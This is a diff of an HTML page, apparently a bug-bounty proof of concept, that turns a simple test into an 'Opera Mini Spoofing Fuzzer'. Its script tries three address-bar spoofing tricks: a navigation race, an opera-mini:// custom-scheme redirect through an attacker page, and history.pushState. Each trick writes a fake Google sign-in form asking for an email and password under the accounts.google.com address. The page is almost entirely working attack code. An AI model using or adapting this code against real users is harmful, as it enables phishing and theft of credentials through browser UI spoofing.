@@ -1,51 +1,157 @@
 <!DOCTYPE html>
-<html>
-<head><meta charset="UTF-8"><title>TC-A: Download Freeze</title></head>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Opera Mini Navigation Fuzzer v2</title>
+<style>
+    body { font-family: sans-serif; padding: 15px; background: #fafafa; color: #333; }
+    .card { background: #fff; padding: 15px; border: 1px solid #ddd; border-radius: 5px; margin-bottom: 15px; }
+    button { background: #4285F4; color: white; border: none; padding: 10px 15px; border-radius: 4px; cursor: pointer; font-weight: bold; width: 100%; margin-top: 10px;}
+    button:hover { background: #357ae8; }
+    input { width: 100%; padding: 8px; margin: 5px 0; border: 1px solid #ccc; border-radius: 4px; box-sizing: border-box; }
+    .log-box { background: #222; color: #00ff00; padding: 10px; border-radius: 5px; font-family: monospace; height: 150px; overflow-y: scroll; font-size: 12px; margin-top: 10px;}
+    .title { font-weight: bold; margin-bottom: 5px; color: #d32f2f; }
+</style>
+</head>
 <body>
-<h3>TC-A: Custom scheme + download freeze</h3>
-<label>Fake domain shown to victim:</label>
-<input id="fake" value="https://accounts.google.com" style="width:400px"><br><br>
-<label>Download trigger URL (attacker):</label>
-<input id="dl" value="https://bugbountychrome.github.io/spoof-dialog/google.apk" style="width:400px"><br><br>
-<button onclick="run()">Run TC-A</button>
-<pre id="log"></pre>
+
+<h2>Opera Mini Spoofing Fuzzer v2</h2>
+<p>Fokus: Memaksa URL Bar terkunci di domain target sebelum UI palsu di-render.</p>
+
+<div class="card">
+    <div class="title">Target Identity (Fake URL)</div>
+    <input type="text" id="targetDomain" value="https://accounts.google.com">
+    
+    <div class="title" style="margin-top:10px;">Attacker Server (Untuk Trik 2)</div>
+    <input type="text" id="attackerServer" value="https://example.com/poc.html">
+</div>
+
+<div class="card">
+    <div class="title">Trik 1: Race Condition (Fast Freeze)</div>
+    <p style="font-size:12px;">Navigasi cepat ke target, freeze, lalu injeksi UI.</p>
+    <button onclick="runTrik1()">Jalankan Trik 1</button>
+</div>
+
+<div class="card">
+    <div class="title">Trik 2: Meta Refresh Bypass</div>
+    <p style="font-size:12px;">Gunakan Custom Scheme ke halaman attacker yang berisi Meta Refresh ke target.</p>
+    <button onclick="runTrik2()">Jalankan Trik 2</button>
+</div>
+
+<div class="card">
+    <div class="title">Trik 3: History PushState Injection</div>
+    <p style="font-size:12px;">Memanipulasi History API dari window kosong.</p>
+    <button onclick="runTrik3()">Jalankan Trik 3</button>
+</div>
+
+<h3>Log:</h3>
+<div id="log" class="log-box">Siap...</div>
+
 <script>
-const log = m => document.getElementById('log').textContent += m + "\n";
-
-async function run() {
-  const fake = document.getElementById('fake').value;
-  const dl   = document.getElementById('dl').value;
-
-  // 1. buka window kosong dari origin ini
-  const w = window.open("about:blank", "_blank");
-  if (!w) { log("popup blocked"); return; }
-
-  // 2. picu download lewat custom scheme (freeze kandidat)
-  w.location.href = `opera-mini://open?url=${encodeURIComponent(dl)}`;
-
-  // 3. tunggu download mulai, lalu tulis konten palsu
-  //    variasikan delay: 0, 50, 150, 300, 500 ms
-  for (const d of [0, 50, 150, 300, 500]) {
-    await new Promise(r => setTimeout(r, d));
-    try {
-      w.document.open();
-      w.document.write(`<!doctype html><html><head><title>${fake}</title></head>
-        <body style="font-family:sans-serif;text-align:center;padding-top:60px">
-        <h2>Sign in</h2>
-        <p>delay=${d}ms</p>
-        <input placeholder="email"><br><br>
-        <input type="password" placeholder="password"><br><br>
-        <button onclick="alert('leaked')">Next</button>
-        </body></html>`);
-      w.document.close();
-      w.stop();
-      log(`wrote at ${d}ms — CEK ADDRESS BAR SEKARANG`);
-    } catch (e) {
-      log(`SOP block at ${d}ms: ${e.message}`);
+    const logBox = document.getElementById('log');
+    function log(msg) {
+        logBox.innerHTML += `[${new Date().toLocaleTimeString()}] ${msg}<br>`;
+        logBox.scrollTop = logBox.scrollHeight;
     }
-  }
-  log("TC-A done. Catat: apakah address bar menampilkan about:blank / domain attacker / fake?");
-}
+
+    function getFakeUI(delayInfo) {
+        return `
+            <html>
+            <head><title>Sign in</title></head>
+            <body style="font-family:sans-serif; text-align:center; padding-top:40px; background:#fff;">
+                <h2>Sign in</h2>
+                <p style="color:#666; font-size:12px;">${delayInfo}</p>
+                <div style="display:inline-block; text-align:left; width:280px;">
+                    <input type="text" placeholder="Email or phone" style="width:100%; padding:10px; margin-bottom:10px; border:1px solid #ccc; border-radius:4px;"><br>
+                    <input type="password" placeholder="Password" style="width:100%; padding:10px; margin-bottom:10px; border:1px solid #ccc; border-radius:4px;"><br>
+                    <button style="background:#1a73e8; color:#fff; border:none; padding:10px; width:100%; border-radius:4px; font-weight:bold;">Next</button>
+                </div>
+            </body>
+            </html>
+        `;
+    }
+
+    // ==========================================
+    // TRIK 1: Fast Freeze (Race Condition)
+    // ==========================================
+    async function runTrik1() {
+        const target = document.getElementById('targetDomain').value;
+        log("Memulai Trik 1...");
+        
+        const w = window.open("about:blank", "_blank");
+        if (!w) return log("ERROR: Popup diblokir!");
+
+        // Navigasi langsung ke target asli (bukan custom scheme) agar URL bar update
+        w.location.href = target;
+
+        // Loop delay super cepat untuk menangkap frame sebelum render selesai
+        for (const delay of [10, 30, 50, 100]) {
+            log(`Mencoba freeze di ${delay}ms...`);
+            await new Promise(r => setTimeout(r, delay));
+            
+            try {
+                w.stop(); // Hentikan loading
+                w.document.open();
+                w.document.write(getFakeUI(`Trik 1 - Freeze at ${delay}ms`));
+                w.document.close();
+                log(`-> Sukses injeksi di ${delay}ms. CEK ADDRESS BAR!`);
+            } catch (e) {
+                log(`-> Gagal di ${delay}ms (SOP): ${e.message}`);
+            }
+            // Jeda sebelum iterasi berikutnya agar kamu bisa lihat hasilnya
+            await new Promise(r => setTimeout(r, 3000)); 
+            try { w.close(); } catch(e){}
+            // Buka window baru untuk delay berikutnya
+            w = window.open("about:blank", "_blank");
+            w.location.href = target;
+        }
+    }
+
+    // ==========================================
+    // TRIK 2: Meta Refresh Bypass
+    // ==========================================
+    function runTrik2() {
+        const attacker = document.getElementById('attackerServer').value;
+        const target = document.getElementById('targetDomain').value;
+        log("Memulai Trik 2...");
+        log("Pastikan file di server attacker berisi Meta Refresh ke target dan script document.write UI palsu.");
+
+        // Kita panggil attacker server via custom scheme (memicu bug awal)
+        const payload = `opera-mini://open?url=${encodeURIComponent(attacker)}`;
+        const w = window.open("about:blank", "_blank");
+        
+        if (!w) return log("ERROR: Popup diblokir!");
+        
+        w.location.href = payload;
+        log("Payload dikirim via opera-mini://. Cek apakah address bar berubah menjadi Target Domain.");
+    }
+
+    // ==========================================
+    // TRIK 3: History PushState
+    // ==========================================
+    async function runTrik3() {
+        const target = document.getElementById('targetDomain').value;
+        log("Memulai Trik 3...");
+
+        const w = window.open("about:blank", "_blank");
+        if (!w) return log("ERROR: Popup diblokir!");
+
+        try {
+            // Trik: Ubah URL di history tanpa reload
+            w.history.pushState({}, '', target);
+            log("pushState berhasil.");
+            
+            // Injeksi UI
+            w.document.open();
+            w.document.write(getFakeUI("Trik 3 - History PushState"));
+            w.document.close();
+            w.stop();
+            log("-> Injeksi selesai. CEK ADDRESS BAR!");
+        } catch (e) {
+            log(`-> Gagal PushState (SOP): ${e.message}`);
+        }
+    }
 </script>
 </body>
 </html>
